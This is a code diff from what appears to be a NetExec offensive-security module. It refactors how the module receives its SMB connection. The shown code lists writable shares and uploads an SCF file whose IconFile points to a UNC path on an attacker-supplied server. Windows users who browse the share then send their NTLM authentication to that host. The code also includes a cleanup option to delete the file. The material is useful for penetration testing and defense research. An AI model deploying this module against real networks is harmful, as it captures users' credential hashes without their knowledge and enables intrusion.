@@ -23,8 +23,9 @@ class NXCModule:
         subparsers.add_argument("--cleanup", help="Clean the SCF file previously dropped", default=False, action="store_true")
         return subparsers
 
-    def __init__(self, context=None, module_options=None):
+    def __init__(self, context=None, connection=None, module_options=None):
         self.context = context
+        self.connection = connection
         self.module_options = module_options
         self.cleanup = module_options.cleanup
         self.server = module_options.server_ip
@@ -40,8 +41,8 @@ class NXCModule:
                 scuf.write("Command=2\n")
                 scuf.write(f"IconFile=\\\\{self.server}\\share\\icon.ico\n")
 
-    def on_login(self, connection):
-        shares = connection.shares()
+    def on_login(self):
+        shares = self.connection.shares()
         for share in shares:
             if "WRITE" in share["access"] and share["name"] not in [
                 "C$",
@@ -52,13 +53,13 @@ class NXCModule:
                 if not self.cleanup:
                     with open(self.scf_path, "rb") as scf:
                         try:
-                            connection.conn.putFile(share["name"], self.file_path, scf.read)
+                            self.connection.conn.putFile(share["name"], self.file_path, scf.read)
                             self.context.log.success(f"Created SCF file on the {share['name']} share")
                         except Exception as e:
                             self.context.log.fail(f"Error writing SCF file to share {share['name']}: {e}")
                 else:
                     try:
-                        connection.conn.deleteFile(share["name"], self.file_path)
+                        self.connection.conn.deleteFile(share["name"], self.file_path)
                         self.context.log.success(f"Deleted SCF file on the {share['name']} share")
                     except Exception as e:
                         self.context.log.fail(f"Error deleting SCF file on share {share['name']}: {e}")
